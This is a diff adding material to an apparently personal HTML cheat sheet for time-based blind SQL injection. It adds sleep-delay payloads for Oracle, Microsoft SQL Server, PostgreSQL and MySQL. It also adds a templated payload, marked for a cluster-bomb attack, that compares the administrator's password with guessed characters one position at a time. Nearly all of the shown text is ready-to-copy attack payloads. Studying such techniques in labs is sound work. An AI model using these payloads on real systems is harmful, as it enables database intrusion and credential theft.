@@ -353,6 +353,13 @@ since the query is executed synchronously, it is possible to trigger conditional
 
 1. IDENTIFY IF TIME DELAY TECHNIQUE CAN BE USED [10 seconds]
 
+> PER DATABASE ATTEMPT
+
+<b>ORACLE:</b> dbms_pipe.receive_message(('a'),10)
+<b>Microsoft:</b> WAITFOR DELAY '0:0:10'
+<b>PostgreSQL:</b> SELECT pg_sleep(10)
+<b>MySQL:</b> SELECT SLEEP(10)
+
 <b>C1: </b><p id="TDT01"><mark>'||pg_sleep(10)--</mark></p>
 <b>SAMPLE: </b><mark>'||pg_sleep(10)--</mark>
 
@@ -364,6 +371,7 @@ since the query is executed synchronously, it is possible to trigger conditional
 2. RETRIEVE DATA
 
 pre-reqs:
+	
 1. table name
 2. column name
 	
@@ -386,14 +394,18 @@ Send series of requests modifying the character count,
 	
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#TDT05')">.C2.</button>
 
-> CONFIRM CHARACTER VALUE
+> CONFIRM CHARACTER VALUE ITERATING POSITIONS
 
 <b>C3: </b><p id="TDT06"><mark>';SELECT CASE WHEN (COLUMN_NAME='VALUE' AND SUBSTRING(COLUMN_NAME,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM TABLE_NAME--</mark></p>
 <b>SAMPLE: </b><mark>';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--</mark>
 
 <b>NOTE: </b> using substring() functions can help to extract a single character to compare it.
 
+<b>SAMPLE: </b><mark>';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,§1§,1)='§a§') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--</mark>
 
+CLUSTER BOMB ATTACK!!
+
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#TDT06')">.C3.</button>
 	
 </p>
 </details>
